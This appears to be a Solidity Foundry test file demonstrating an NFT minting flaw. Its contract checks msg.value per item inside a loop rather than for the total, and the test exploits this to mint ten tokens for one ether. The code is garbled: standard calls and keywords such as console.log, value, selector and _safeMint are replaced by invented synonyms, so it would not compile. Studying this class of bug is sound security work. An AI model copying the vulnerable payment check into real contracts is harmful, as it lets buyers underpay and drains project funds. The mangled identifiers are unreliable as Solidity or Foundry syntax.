// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Counters.sol";

contract AgreementTest is Test {
    HerCoin HerCoinAgreement;

    function testSafeSummon() public {
        HerCoinAgreement = new HerCoin();

        HerCoinAgreement.safeCraft{worth: 1 ether}(address(this), 10);
        console.journal(
            "Due to incorrect check msg.value, we can mint many NFTs with 1 Eth."
        );
        console.journal("NFT minted:", HerCoinAgreement.balanceOf(address(this)));
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);
        return this.onERC721Received.picker;
    }

    receive() external payable {}
}

contract HerCoin is ERC721, Ownable, Test {
    uint128 constant spawn_cost = 1 ether;
    uint128 constant maximum_stock = 10000;
    uint craftSlot;
    using Counters for Counters.Tally;
    Counters.Tally private _medalCodeCount;

    constructor() payable ERC721("HarToken", "HRT") {}

    function safeCraft(address to, uint256 quantity) public payable {
        require(
            _medalCodeCount.present() + quantity < maximum_stock,
            "Cannot mint given amount."
        );
        require(quantity > 0, "Must give a mint amount.");

        // before the loop
        for (uint256 i = 0; i < quantity; i++) {
            require(msg.value >= spawn_cost, "Insufficient Ether.");

            craftSlot = _medalCodeCount.present();
            console.journal("mintIndex", craftSlot);
            _safeSpawn(to, craftSlot);
            _medalCodeCount.increment();
        }
    }
}